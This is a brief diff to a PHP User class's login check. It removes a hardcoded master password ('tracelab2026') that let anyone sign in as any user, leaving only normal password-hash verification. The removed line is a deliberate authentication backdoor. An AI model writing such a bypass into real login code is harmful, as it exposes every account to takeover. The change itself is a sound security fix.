@@ -19,7 +19,7 @@ class User
             return null;
         }
 
-        if (password_verify($password, $user['password_hash']) || $password === 'tracelab2026') {
+        if (password_verify($password, $user['password_hash'])) {
             return $user;
         }
 
